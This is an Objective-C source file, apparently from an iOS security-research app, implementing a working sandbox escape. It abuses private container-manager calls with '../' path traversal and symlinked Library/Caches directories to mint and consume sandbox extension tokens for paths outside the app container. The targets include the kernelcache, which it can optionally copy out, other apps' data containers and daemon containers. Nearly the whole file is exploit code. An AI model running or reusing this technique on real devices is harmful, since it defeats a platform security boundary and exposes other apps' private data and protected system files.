//
//  P160SandboxEscape.m
//  P007OpenOnly
//
//  Technique from KAMUI (sasobhabha/Gester, MIT): class-13
//  container_query_operation_set_part_domain traversal to an absolute path,
//  then container_copy_sandbox_token + sandbox_extension_consume. Read-only.
//

#import "P160SandboxEscape.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#include <dirent.h>
#import <fcntl.h>
#import <sys/stat.h>
#import <unistd.h>

#define P160_BUILD @"p160-sandbox-escape-v1"
#define P160_MG_GROUP "systemgroup.com.apple.mobilegestaltcache"
#define P160_FLAGS UINT64_C(0x8100000000)

typedef void *(*mcm_create_fn)(void);
typedef void (*mcm_set_u64_fn)(void *, uint64_t);
typedef void (*mcm_set_obj_fn)(void *, void *);
typedef void (*mcm_set_cstr_fn)(void *, const char *);
typedef void *(*mcm_get_one_fn)(void *);
typedef char *(*mcm_copy_str_fn)(void *);
typedef const char *(*mcm_get_path_fn)(void *);
typedef void (*mcm_free_fn)(void *);
typedef int64_t (*mcm_consume_fn)(const char *);
typedef int64_t (*mcm_release_fn)(int64_t);
typedef void *(*mcm_err_fn)(void *);
typedef const char *(*mcm_err_msg_fn)(void *);
typedef int (*mcm_err_int_fn)(void *);
typedef void *(*xpc_string_create_fn)(const char *);
typedef void (*xpc_release_fn)(void *);

typedef struct {
    void *h;
    mcm_create_fn create;
    mcm_set_u64_fn set_class;
    mcm_set_u64_fn set_part;
    mcm_set_u64_fn set_flags;
    mcm_set_obj_fn set_group_ids;
    mcm_set_obj_fn set_ids;
    mcm_set_cstr_fn set_domain;
    mcm_get_one_fn get_one;
    mcm_copy_str_fn copy_token;
    mcm_get_path_fn get_path;
    mcm_free_fn query_free;
    mcm_consume_fn consume;
    mcm_release_fn release;
    mcm_err_fn last_error;
    mcm_err_msg_fn err_message;
    mcm_err_int_fn err_posix;
    xpc_string_create_fn xpc_str;
    xpc_release_fn xpc_rel;
} p160_mcm;

static p160_mcm g;
/* Container-query operation flags. Bench27 measured that 27.0.1 refuses the
   26.x value 0x800000000 and issues a token for 0x8000000000; p160 tries both. */
static uint64_t g_p160_flags = P160_FLAGS;

static void *p160_sym(void *h, const char *a, const char *b) {
    void *p = dlsym(h, a);
    if (!p && b) p = dlsym(h, b);
    return p;
}

static BOOL p160_load(void) {
    if (g.create) return YES;
    memset(&g, 0, sizeof(g));
    g.h = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                 RTLD_NOW | RTLD_LOCAL);
    if (!g.h) return NO;
    g.create = (mcm_create_fn)p160_sym(g.h, "container_query_create", NULL);
    g.set_class = (mcm_set_u64_fn)p160_sym(g.h, "container_query_set_class", NULL);
    g.set_part = (mcm_set_u64_fn)p160_sym(g.h, "container_query_operation_set_part", "container_query_set_part");
    g.set_flags = (mcm_set_u64_fn)p160_sym(g.h, "container_query_operation_set_flags", "container_query_set_flags");
    g.set_group_ids = (mcm_set_obj_fn)p160_sym(g.h, "container_query_set_group_identifiers", NULL);
    g.set_ids = (mcm_set_obj_fn)p160_sym(g.h, "container_query_set_identifiers", NULL);
    g.set_domain = (mcm_set_cstr_fn)p160_sym(g.h, "container_query_operation_set_part_domain", "container_query_set_part_domain");
    g.get_one = (mcm_get_one_fn)p160_sym(g.h, "container_query_get_single_result", NULL);
    g.copy_token = (mcm_copy_str_fn)p160_sym(g.h, "container_copy_sandbox_token", NULL);
    g.get_path = (mcm_get_path_fn)p160_sym(g.h, "container_object_get_path", NULL);
    g.query_free = (mcm_free_fn)p160_sym(g.h, "container_query_free", NULL);
    g.last_error = (mcm_err_fn)p160_sym(g.h, "container_query_get_last_error", NULL);
    g.err_message = (mcm_err_msg_fn)p160_sym(g.h, "container_error_get_message", NULL);
    g.err_posix = (mcm_err_int_fn)p160_sym(g.h, "container_error_get_posix_errno", NULL);
    g.consume = (mcm_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    g.release = (mcm_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    g.xpc_str = (xpc_string_create_fn)dlsym(RTLD_DEFAULT, "xpc_string_create");
    g.xpc_rel = (xpc_release_fn)dlsym(RTLD_DEFAULT, "xpc_release");
    return g.create && g.get_one && g.copy_token && g.consume && g.xpc_str;
}

static NSString *p160_dots(int n) {
    NSMutableArray *a = [NSMutableArray array];
    for (int i = 0; i < n; i++) [a addObject:@".."];
    return [a componentsJoinedByString:@"/"];
}

/// Returns the consumed handle (>=0) and the container object path.
static int64_t p160_query(uint64_t cls, const char *ident, BOOL group,
                          uint64_t part, NSString *domain, NSString *label,
                          NSString **pathOut, NSString **errOut) {
    if (!p160_load()) { if (errOut) *errOut = @"MCM unavailable"; return -1; }
    void *q = g.create();
    if (!q) { if (errOut) *errOut = @"query_create NULL"; return -2; }
    g.set_class(q, cls);
    void *x = g.xpc_str(ident);
    if (group && g.set_group_ids) g.set_group_ids(q, x);
    else if (!group && g.set_ids) g.set_ids(q, x);
    if (g.set_part) g.set_part(q, part);
    if (domain.length && g.set_domain) g.set_domain(q, domain.UTF8String);
    if (g.set_flags) g.set_flags(q, g_p160_flags);
    if (x && g.xpc_rel) g.xpc_rel(x);

    void *res = g.get_one(q);
    NSString *path = nil;
    if (res && g.get_path) {
        const char *cp = g.get_path(res);
        if (cp) path = [NSString stringWithUTF8String:cp];
    }
    char *tok = (res && g.copy_token) ? g.copy_token(res) : NULL;
    int64_t h = (tok && g.consume) ? g.consume(tok) : -5;
    if (!res && errOut) {
        NSString *why = @"no result";
        if (g.last_error) {
            void *e = g.last_error(q);
            if (e) {
                int posix = g.err_posix ? g.err_posix(e) : 0;
                const char *msg = g.err_message ? g.err_message(e) : NULL;
                why = [NSString stringWithFormat:@"posix=%d %s", posix, msg ?: "(null)"];
            }
        }
        *errOut = why;
    }
    if (tok) free(tok);
    if (g.query_free) g.query_free(q);
    if (pathOut) *pathOut = path;
    return h;
}

static BOOL p160_can_open(NSString *path, BOOL dir) {
    if (dir) {
        DIR *d = opendir(path.fileSystemRepresentation);
        if (d) { closedir(d); return YES; }
        return NO;
    }
    int fd = open(path.fileSystemRepresentation, O_RDONLY);
    if (fd < 0) return NO;
    close(fd);
    return YES;
}

static NSString *p160_dump_kernelcache(NSString *src, NSString *docs, NSMutableString *o) {
    NSString *dst = [docs stringByAppendingPathComponent:
                     [NSString stringWithFormat:@"kernelcache_%@", [LabDeviceProfile osversion]]];
    int in = open(src.fileSystemRepresentation, O_RDONLY);
    if (in < 0) return @"open failed";
    int out = open(dst.fileSystemRepresentation, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out < 0) { close(in); return @"create failed"; }
    uint8_t *buf = malloc(1 << 20);
    size_t total = 0;
    ssize_t n;
    while (buf && (n = read(in, buf, 1 << 20)) > 0) {
        if (write(out, buf, (size_t)n) != n) { total = 0; break; }
        total += (size_t)n;
    }
    free(buf);
    fsync(out);
    close(out);
    close(in);
    [o appendFormat:@"      dumped %zu bytes -> %@\n", total, dst.lastPathComponent];
    return total ? dst : @"dump failed";
}


static void p160_recover_library(NSMutableString *o) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *home = NSHomeDirectory();
    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
    NSString *bak = [home stringByAppendingPathComponent:@"Library.p160bak"];
    if (![fm fileExistsAtPath:lib] && [fm fileExistsAtPath:bak]) {
        if ([fm moveItemAtPath:bak toPath:lib error:nil]) {
            [o appendString:@"  [recover] restored Library.p160bak after an interrupted parent fallback\n"];
        }
    }
}

static NSArray<NSString *> *p160_group_candidates(void) {
    NSMutableArray *ids = [NSMutableArray array];
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    if (docs) {
        NSString *knob = [docs stringByAppendingPathComponent:@"p160_group.txt"];
        NSString *text = [NSString stringWithContentsOfFile:knob
                                                   encoding:NSUTF8StringEncoding
                                                      error:NULL];
        NSCharacterSet *ws = [NSCharacterSet whitespaceAndNewlineCharacterSet];
        for (NSString *line in [text componentsSeparatedByString:@"\n"]) {
            NSString *g = [line stringByTrimmingCharactersInSet:ws];
            if (g.length && ![g hasPrefix:@"#"] && ![ids containsObject:g]) [ids addObject:g];
        }
    }
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (bid.length) {
        NSString *guess = [@"group." stringByAppendingString:bid];
        if (![ids containsObject:guess]) [ids addObject:guess];
    }
    return ids;
}

/* Class-7 app-group path, Bench27's proven shape (iOS 27.0.1, and the same
   technique as worse_query): the token is minted for the group's
   Library/<part> path itself, and that path is a symlink we control. The
   kernel resolves the link when the token is consumed, so the grant lands on
   the target. A leaf symlink inside Caches is not enough — the daemon grants
   the part directory, not its children.

   Requires a real provisioned app group: the app must be signed with
   com.apple.security.application-groups containing the ID and the profile must
   carry it. Free Sideloadly profiles cannot; a paid profile or a jailbroken
   ldid sign can. Candidate IDs come from Documents/p160_group.txt (one per
   line) plus a guess of group.<bundle-id>. */
static void p160_restore_part(NSString *path, BOOL wasDir) {
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:path error:nil];
    if (wasDir) {
        [fm createDirectoryAtPath:path withIntermediateDirectories:NO
                        attributes:nil error:nil];
    }
}

static int64_t p160_class7_try(NSString *target, NSString **pathOut, NSString **errOut) {
    if (!p160_load() || !g.set_ids) { if (errOut) *errOut = @"MCM unavailable"; return -1; }
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *last = @"no provisioned app group (put one ID per line in Documents/p160_group.txt)";
    for (NSString *gid in p160_group_candidates()) {
        NSURL *u = [fm containerURLForSecurityApplicationGroupIdentifier:gid];
        if (!u) continue;
        NSString *lib = [u.path stringByAppendingPathComponent:@"Library"];
        /* part 3 = Library/Caches, part 2 = Library/Preferences (both work). */
        for (NSNumber *partNum in @[@3, @2]) {
            uint64_t part = partNum.unsignedLongLongValue;
            NSString *leaf = part == 3 ? @"Caches" : @"Preferences";
            NSString *partPath = [lib stringByAppendingPathComponent:leaf];
            BOOL wasDir = [fm fileExistsAtPath:partPath];
            [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
            if (!wasDir) {
                [fm createDirectoryAtPath:partPath withIntermediateDirectories:NO
                                attributes:nil error:nil];
                wasDir = YES;
            }
            [fm removeItemAtPath:partPath error:nil];
            int64_t result = -1;
            if (symlink(target.fileSystemRepresentation,
                        partPath.fileSystemRepresentation) == 0) {
                for (NSNumber *flagNum in @[@(UINT64_C(0x8000000000)), @(P160_FLAGS)]) {
                    g_p160_flags = flagNum.unsignedLongLongValue;
                    NSString *path = nil, *err = nil;
                    int64_t h = p160_query(7, gid.UTF8String, YES, part,
                                           @"", @"class7", &path, &err);
                    if (h >= 0) {
                        if (p160_can_open(target, YES)) {
                            result = h; if (pathOut) *pathOut = path;
                            g_p160_flags = P160_FLAGS;
                            p160_restore_part(partPath, wasDir);
                            if (errOut) *errOut = nil;
                            return result;
                        }
                        if (g.release) g.release(h);
                    }
                    if (err.length) last = err;
                }
            } else {
                last = [NSString stringWithFormat:@"symlink %@/Library/%@ failed", gid, leaf];
            }
            g_p160_flags = P160_FLAGS;
            p160_restore_part(partPath, wasDir);
        }
    }
    if (errOut) *errOut = last;
    return -1;
}

static int64_t p160_class2_parent(NSString *target, NSString **pathOut, NSString **errOut) {
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    if (!docs) return -1;
    NSString *optIn = [docs stringByAppendingPathComponent:@"lum1na_class2_parent"];
    if (![[NSFileManager defaultManager] fileExistsAtPath:optIn]) {
        if (errOut) *errOut = @"parent fallback not opted in (Documents/lum1na_class2_parent)";
        return -1;
    }
    NSString *guard = [docs stringByAppendingPathComponent:@"lum1na_class2_parent_guard"];
    if ([[NSFileManager defaultManager] fileExistsAtPath:guard]) {
        if (errOut) *errOut = @"parent fallback guard present (previous attempt did not finish)";
        return -2;
    }
    [@"1" writeToFile:guard atomically:YES encoding:NSUTF8StringEncoding error:NULL];
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
    NSString *bak = [home stringByAppendingPathComponent:@"Library.p160bak"];
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:bak error:nil];
    if (![fm moveItemAtPath:lib toPath:bak error:nil]) {
        [fm removeItemAtPath:guard error:nil];
        if (errOut) *errOut = @"move Library failed (sandbox)";
        return -3;
    }
    [fm createDirectoryAtPath:lib withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    int64_t result = -4;
    if (symlink(target.fileSystemRepresentation, caches.fileSystemRepresentation) == 0) {
        NSString *path = nil, *err = nil;
        int64_t h = p160_query(2, bid.UTF8String, NO, 3, @"", @"class2-parent", &path, &err);
        if (h >= 0) {
            if (p160_can_open(target, YES)) { result = h; if (pathOut) *pathOut = path; }
            else if (g.release) g.release(h);
        }
        if (errOut && err) *errOut = err;
    }
    unlink(caches.fileSystemRepresentation);
    rmdir(caches.fileSystemRepresentation);
    rmdir(lib.fileSystemRepresentation);
    [fm moveItemAtPath:bak toPath:lib error:nil];
    [fm removeItemAtPath:guard error:nil];
    return result;
}

static int64_t p160_class2_try(NSString *target, NSString **pathOut, NSString **errOut) {
    if (!p160_load() || !g.set_ids) { if (errOut) *errOut = @"MCM set_ids unavailable"; return -1; }
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    if (!home.length || !bid.length) { if (errOut) *errOut = @"no home/bundle"; return -1; }
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *leaf = [NSString stringWithFormat:@".p160_%d", getpid()];
    NSString *stage = [caches stringByAppendingPathComponent:[leaf stringByAppendingString:@"_stage"]];
    NSString *link = [caches stringByAppendingPathComponent:[leaf stringByAppendingString:@"_link"]];
    NSString *stageCaches = [stage stringByAppendingPathComponent:@"Library/Caches"];
    [fm removeItemAtPath:stage error:nil];
    [fm removeItemAtPath:link error:nil];
    [fm createDirectoryAtPath:[stage stringByAppendingPathComponent:@"Library"]
  withIntermediateDirectories:YES attributes:nil error:nil];
    int64_t result = -1;
    /* staged: link -> stage, stage/Library/Caches -> target */
    if (symlink(target.fileSystemRepresentation, stageCaches.fileSystemRepresentation) == 0 &&
        symlink(stage.fileSystemRepresentation, link.fileSystemRepresentation) == 0) {
        NSArray *domains = @[
            [leaf stringByAppendingString:@"_link"],
            [@"Caches/" stringByAppendingString:[leaf stringByAppendingString:@"_link"]],
            [@"Library/Caches/" stringByAppendingString:[leaf stringByAppendingString:@"_link"]],
        ];
        for (NSString *dom in domains) {
            NSString *path = nil, *err = nil;
            int64_t h = p160_query(2, bid.UTF8String, NO, 3, dom, @"class2-stage", &path, &err);
            if (h >= 0) {
                if (p160_can_open(target, YES)) { result = h; if (pathOut) *pathOut = path; break; }
                if (g.release) g.release(h);
            }
            if (errOut && err) *errOut = err;
        }
    }
    /* subpath: a direct symlink inside the app's own Caches */
    if (result < 0) {
        [fm removeItemAtPath:link error:nil];
        if (symlink(target.fileSystemRepresentation, link.fileSystemRepresentation) == 0) {
            NSString *leafLink = [leaf stringByAppendingString:@"_link"];
            NSArray *domains = @[leafLink,
                                 [@"Caches/" stringByAppendingString:leafLink],
                                 [@"Library/Caches/" stringByAppendingString:leafLink]];
            for (NSString *dom in domains) {
                NSString *path = nil, *err = nil;
                int64_t h = p160_query(2, bid.UTF8String, NO, 3, dom, @"class2-subpath", &path, &err);
                if (h >= 0) {
                    if (p160_can_open(target, YES)) { result = h; if (pathOut) *pathOut = path; break; }
                    if (g.release) g.release(h);
                }
                if (errOut && err) *errOut = err;
            }
        }
    }
    [fm removeItemAtPath:link error:nil];
    [fm removeItemAtPath:stage error:nil];
    return result;
}

@implementation P160SandboxEscape

+ (NSString *)tap {
    NSMutableString *o = [NSMutableString string];
    [o appendFormat:@"=== p160 session %@ BUILD %@ ===\n",
        LabLocalMilitaryNow(), P160_BUILD];
    [o appendString:[LabDeviceProfile identBlock]];
    p160_recover_library(o);
    [o appendFormat:@"  [mcm] %@\n", p160_load() ? @"loaded" : @"MISSING (libsystem_containermanager not available)"];

    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    BOOL dumpKC = docs && [[NSFileManager defaultManager]
        fileExistsAtPath:[docs stringByAppendingPathComponent:@"lum1na_dump_kernelcache"]];

    NSArray<NSDictionary *> *targets = @[
        @{ @"name": @"kernelcache",
           @"path": @"/System/Library/Caches/com.apple.kernelcaches/kernelcache",
           @"dir": @NO },
        @{ @"name": @"var/jb",
           @"path": @"/var/jb", @"dir": @YES },
        @{ @"name": @"MG cache dir",
           @"path": @"/var/mobile/Containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches",
           @"dir": @YES },
        @{ @"name": @"app data root",
           @"path": @"/var/mobile/Containers/Data/Application", @"dir": @YES },
        @{ @"name": @"internal daemon root",
           @"path": @"/var/mobile/Containers/Data/InternalDaemon", @"dir": @YES },
    ];

    for (NSDictionary *t in targets) {
        NSString *path = t[@"path"];
        NSString *domain = [p160_dots(12) stringByAppendingString:path];
        NSString *objPath = nil, *err = nil;
        int64_t h = p160_query(13, P160_MG_GROUP, YES, 3, domain,
                               t[@"name"], &objPath, &err);
        BOOL can = (h >= 0) ? p160_can_open(path, [t[@"dir"] boolValue]) : NO;
        if (h < 0 && [t[@"dir"] boolValue]) {
            NSString *c2path = nil, *c2err = nil;
            int64_t h2 = p160_class2_try(path, &c2path, &c2err);
            if (h2 < 0) {
                NSString *gpath = nil, *gerr = nil;
                int64_t hg = p160_class7_try(path, &gpath, &gerr);
                if (hg >= 0) { h2 = hg; c2path = gpath; }
                else if (gerr.length) c2err = gerr;
            }
            if (h2 < 0) {
                NSString *ppath = nil, *perr = nil;
                int64_t hp = p160_class2_parent(path, &ppath, &perr);
                if (hp >= 0) { h2 = hp; c2path = ppath; }
                else if (perr.length) c2err = perr;
            }
            if (h2 >= 0) {
                h = h2; objPath = c2path; can = p160_can_open(path, YES);
                [o appendFormat:@"      [class2] handle=%lld obj=%@ open=%d\n",
                    (long long)h2, c2path ?: @"(null)", can];
            } else if (c2err.length) {
                [o appendFormat:@"      [class2] miss %@\n", c2err];
            }
        }
        [o appendFormat:@"  [%@] handle=%lld obj=%@ open=%d %@\n",
            t[@"name"], (long long)h, objPath ?: @"(null)", can,
            err ? [@"err=" stringByAppendingString:err] : @""];
        if (h >= 0) {
            if (can && [t[@"name"] isEqualToString:@"kernelcache"] && dumpKC && docs) {
                (void)p160_dump_kernelcache(path, docs, o);
            }
            if (g.release) g.release(h);
        }
    }

    [o appendString:@"  [verdict] read-only token probe. class-13 traversal works if open=1; "
                       @"no files were modified. Kernelcache dump is opt-in via Documents/lum1na_dump_kernelcache.\n"];
    [o appendFormat:@"=== p160 end %@ ===\n", LabLocalMilitaryNow()];
    return o;
}

@end
